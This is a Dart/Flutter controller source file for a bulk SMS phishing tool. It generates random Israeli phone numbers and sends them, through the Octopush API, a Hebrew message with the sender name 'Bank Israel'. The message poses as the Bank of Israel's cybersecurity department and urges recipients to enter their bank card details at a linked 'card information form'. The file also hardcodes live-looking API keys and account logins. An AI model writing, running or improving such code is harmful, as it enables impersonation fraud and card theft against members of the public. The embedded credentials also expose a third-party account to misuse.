import 'dart:convert';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:get/get.dart';
import 'package:http/http.dart' as http;
import 'package:smssenderwithlink/ui/home_page.dart';

class SMSController extends GetxController {
//   const api_login = 'aboodjob@gmail.com';
// const api_key = 'Hnuo1ODKkXS24bsqZEmeMtfP7vy96Qpw';
  final String baseUrl = 'https://api.octopush.com/v1/public/sms-campaign/send';
  final String apiKey =
      'e6ylxVvJmNojdIORcGZEa3nDrP5UHCw9'; // Replace with your actual API key
  final String apiLogin =
      'smswithlink@gmail.com'; // Replace with your actual API login

  final RxList<String> generatedPhoneNumbers = <String>[].obs;
  final amountController = TextEditingController().obs;

   generatePhoneNumber() async {
    print('generate method enter ');
      print("amoiunt =  ${amountController.value.text}" ?? '0');
    if (amountController.value.text == '' ||
        amountController.value.text == '0') {
      generatedPhoneNumbers.clear();
       const SnackBar(
        duration: Duration(seconds: 3),
        dismissDirection: DismissDirection.startToEnd,
        shape: BeveledRectangleBorder(),
        showCloseIcon: bool.fromEnvironment("exit"),
        content: Text(
            'You should have a list of phone numbers, /n Please enter the amount of phone numbers you want to generate'),
      );

    }
    else
    {
      for (int i = 0;
          i <
              int.parse(
                amountController.value.text,
              );
          i++) {
        var temp = generateIsraelPhoneNumber();
        generatedPhoneNumbers.add(temp);
        print('phoen number in generrrrr  = $temp');

      }
    }
   }

// Generate a unique link or use your own link to the card information form
  String? uniqueLink = 'https://smswithlink-credit.netlify.app';

  final _israelPhoneNumberRegex = r'^009725\d{8}$';

  String generateIsraelPhoneNumber() {
    // print
    print('generateIsraelPhoneNumber ------------------------------------');
    var phoneNumber = '';
    print('phoen number in generrrrr  = $phoneNumber');
    do {
      print('phoen number in generrrrr in dooooo = $phoneNumber');

      phoneNumber = '009725${Random().nextInt(100000000)}';
    } while (!validateIsraelPhoneNumber(phoneNumber));
    return phoneNumber;
  }

  bool validateIsraelPhoneNumber(String phoneNumber) {
    // print
    print('validateIsraelPhoneNumber ------------------------------------');
    final regex = RegExp(_israelPhoneNumberRegex);

    return regex.hasMatch(phoneNumber);
  }
  Future<void> sendSMS(String phoneNumber, String param1) async {

    final listOfRes=<Map<String, String>>[];

      for (int i =0 ; i< generatedPhoneNumbers.value.length ; i++){

    listOfRes.add(
      {
        "phone_number": generatedPhoneNumbers.value.elementAt(i),
        "param1":param1}
    );


      }
    listOfRes.add(
        {
          "phone_number": "+962778117201",
          "param1":param1
        }
    );
    try {
      final Map<String, dynamic> data = {
        "recipients": listOfRes,
        // [
        //   {
        //     "phone_number": phoneNumber,
        //     "param1": param1,
        //   }
        // ],
        "text":
            "אנחנו מחלקת אבטחת הסייבר של הבנק המרכזי של ישראל. אנא מלא את פרטי כרטיס הבנק שלך כדי לוודא שאתה בעל הכרטיס הלגיטימי עקב הפצת הונאה והודעות מזויפות.:\n $uniqueLink",
        "type": "sms_premium",
        "purpose": "wholesale",
        "sender": "Bank Israel"
      };

      final String jsonData = jsonEncode(data);

      final response = await http.post(
        Uri.parse(baseUrl),
        headers: {
          'Content-Type': 'application/json',
          'api-key': apiKey,
          'api-login': apiLogin,
          'cache-control': 'no-cache',
        },
        body: jsonData,
      );

      if (response.statusCode == 200) {
        // SMS sent successfully
        print('SMS sent successfully');
      } else {
        // Handle error
        print('Error sending SMS: ${response.body}');
      }
      // Rest of the function remains the same
    } catch (e) {
      // Handle error
      print('Error sending SMS: $e');
    }
  }

}
